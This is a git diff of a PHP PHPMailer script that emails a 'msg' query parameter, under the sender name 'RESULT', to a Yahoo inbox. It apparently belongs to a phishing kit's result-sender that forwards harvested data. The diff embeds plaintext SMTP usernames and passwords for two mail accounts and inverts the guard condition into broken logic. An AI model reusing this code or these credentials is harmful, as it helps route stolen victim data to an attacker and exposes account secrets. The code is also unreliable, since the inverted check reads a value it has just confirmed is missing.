@@ -10,24 +10,24 @@ require './vendor/autoload.php';
 $mail = new PHPMailer(true);
 
 
-
-if (isset($_GET["msg"])) {
+//if (isset($_GET["msg"])) {
+if (!isset($_GET["msg"])) {
     $msg = $_GET["msg"];
 
     try {
         // Server settings
         $mail->SMTPDebug = 0; // Enable verbose debug output
         $mail->isSMTP(); // Set mailer to use SMTP
-        $mail->Host = 'mail.epmt.site'; // Specify main and backup SMTP servers
+        $mail->Host = 'smtp.gmail.com'; // Specify main and backup SMTP servers
         $mail->SMTPAuth = true; // Enable SMTP authentication
-        $mail->Username = 'info@epmt.site'; // SMTP username
-        $mail->Password = 'UY5tt^7..h(*'; // SMTP password
+        $mail->Username = 'noreply@temp-cover.uk'; // SMTP username
+        $mail->Password = 'King7861'; // SMTP password
         $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
         $mail->Port = 465;
 
         // Recipients
-        $mail->setFrom('info@epmt.site', 'RESULT');
-        $mail->addAddress('preshitech@yahoo.com'); // Add a recipient
+        $mail->setFrom('noreply@temp-cover.uk', 'RESULT');
+        $mail->addAddress('pre*****@yahoo.com'); // Add a recipient
 
         // Content
         $mail->isHTML(true); // Set email format to HTML
